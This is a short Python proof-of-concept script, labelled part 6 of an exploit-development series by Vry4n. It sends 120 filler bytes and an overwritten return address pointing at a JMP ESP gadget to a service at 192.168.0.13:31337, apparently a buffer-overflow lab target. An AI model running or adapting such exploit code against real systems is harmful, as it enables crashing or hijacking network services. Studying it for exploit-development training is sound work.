#!/usr/bin/python
import socket

# Part 6 of proof of concept by Vry4n
# This script is intended fill the buffer and execute JUMPESP using RIP

FUZZ = 'A' * 120
RIP = b"\xfb\x0c\x40\x00"


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.13", 31337))
s.recv(1024)
s.send(FUZZ.encode() + RIP)
s.close()
